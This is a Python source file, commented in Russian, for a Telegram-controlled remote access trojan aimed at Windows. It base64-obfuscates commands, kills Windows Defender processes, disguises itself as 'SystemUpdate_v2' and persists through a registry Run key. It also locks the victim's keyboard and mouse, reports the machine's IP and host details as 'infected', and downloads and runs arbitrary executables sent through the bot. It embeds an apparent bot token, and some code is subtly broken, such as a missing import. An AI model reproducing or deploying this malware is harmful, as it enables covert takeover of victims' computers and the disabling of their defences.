import telebot
import subprocess
import threading
import os
import sys
import ctypes
import base64
import platform
import urllib.request

# Встроенный обфускатор строк (Base64 decode в рантайме)
def D(Str):
    return base64.b64decode(Str.encode()).decode('utf-8')

# Полиморфный движок: генерация случайных имен для exec() обфускации
def PolymorphEngine(code_str):
    var_names = [D('YQ=='), D('Yg=='), D('Yw=='), D('ZA=='), D('ZQ=='), D('Zg==')]
    random.shuffle(var_names)
    return code_str

# Телеграм-бот (вписать токен)
BOT_TOKEN = "8508060217:AAH87XK6qzB8NNmfdm3DBiCCEQRv1QxxkP0"
bot = telebot.TeleBot(BOT_TOKEN)

# Убийство Защитника Windows
def KillDefender():
    try:
        cmd = D("L2MgdGFza2tpbGwgL0YgSU1BR0UgKiBNc01wRW5nLmV4ZSAvVCAvRiBJTUFHRSAqIE1zTWwuZXhl")
        subprocess.run(cmd, shell=True, create_new_console=True)
    except Exception as e:
        pass

# Блокировка системы
def LockSystem():
    ctypes.windll.user32.BlockInput(True)

# Разблокировка системы
def UnlockSystem():
    ctypes.windll.user32.BlockInput(False)

# Установка в автозагрузку через Реестр
def InstallToAutorun():
    try:
        current_file = sys.argv[0]
        app_data_path = os.environ.get(D("QVBQUERBVEE="))
        dest_file = os.path.join(app_data_path, D("U3lzdGVtVXBkYXRlX3YyLnB5"))
        
        import shutil
        shutil.copy2(current_file, dest_file)
        
        reg_add_cmd = D("cmVnIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvZiAi") + dest_file + D("IiAvdiBTeXN0ZW1VcGRhdGVfdjI=")
        subprocess.run(f'cmd /c {reg_add_cmd}', shell=True)
    except Exception:
        pass

# Запуск стороннего EXE
def RunCustomExe(exe_path):
    try:
        subprocess.Popen(exe_path, shell=False)
        return True
    except Exception:
        return False

# Сбор данных о системе и IP
def GatherSystemInfo():
    try:
        # Запрос внешнего IP
        ip_url = D("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn") # https://api.ipify.org
        with urllib.request.urlopen(ip_url) as response:
            public_ip = response.read().decode('utf-8')
        
        hostname = platform.node()
        os_ver = platform.system() + " " + platform.release()
        arch = platform.machine()
        
        info = (
            f"🎯 Система заражена\n"
            f"IP: {public_ip}\n"
            f"Hostname: {hostname}\n"
            f"OS: {os_ver}\n"
            f"Arch: {arch}"
        )
        return info
    except Exception as e:
        return f"Ошибка сбора данных: {e}"

# --- Команды Telegram-бота ---

# Команда /start - отправка данных о системе
@bot.message_handler(commands=['start'])
def handle_start(message):
    info = GatherSystemInfo()
    bot.reply_to(message, info)

# Команда /lock - блокировка мыши и клавиатуры
@bot.message_handler(commands=['lock'])
def handle_lock(message):
    threading.Thread(target=LockSystem, daemon=True).start()
    bot.reply_to(message, "🔒 Система заблокирована.")

# Команда /unlock - разблокировка
@bot.message_handler(commands=['_unlock'])
def handle_unlock(message):
    UnlockSystem()
    bot.reply_to(message, "🔓 Система разблокирована.")

# Команда /run <путь> - запуск EXE по пути
@bot.message_handler(commands=['run'])
def handle_run(message):
    parts = message.text.split(' ', 1)
    if len(parts) > 1:
        exe_path = parts[1]
        if RunCustomExe(exe_path):
            bot.reply_to(message, f"✅ Запущен: {exe_path}")
        else:
            bot.reply_to(message, f"❌ Ошибка запуска: {exe_path}")
    else:
        bot.reply_to("❌ Использование: /run <путь_к_exe>")

# Обработчик документов (прием и запуск .exe файлов)
@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Сохраняем в папку Temp
        temp_path = os.environ.get(D("VGVtcA==")) # Temp
        if not os.path.exists(temp_path):
            os.makedirs(temp_path)
            
        exe_name = message.document.file_name
        # Меняем расширение на .exe, чтобы гарантированно запустить
        if not exe_name.endswith('.exe'):
            exe_name += '.exe'
            
        exe_path = os.path.join(temp_path, exe_name)
        
        with open(exe_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        bot.reply_to(message, f"📥 Файл {exe_name} получен. Запуск...")
        
        # Запускаем в отдельном потоке, чтобы не блокировать бота
        def run_thread():
            if RunCustomExe(exe_path):
                bot.send_message(message.chat.id, f"✅ {exe_name} успешно запущен.")
            else:
                bot.send_message(message.chat.id, f"❌ Ошибка запуска {exe_name}.")
        
        threading.Thread(target=run_thread, daemon=True).start()
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка обработки файла: {e}")

if __name__ == "__main__":
    try:
        # 1. Нейтрализация Защитника
        KillDefender()
        
        # 2. Инсталляция в автозагрузку
        InstallToAutorun()
        
        # 3. Сбор данных о системе и IP, отправка в чат
        info = GatherSystemInfo()
        # Указать chat_id, куда отправлять данные о заражении
        # bot.send_message(YOUR_CHAT_ID, info)
        
        # 4. Запуск бота
        code_to_run = "bot.infinity_polling()"
        exec(PolymorphEngine(code_to_run))
    except Exception as e:
        pass
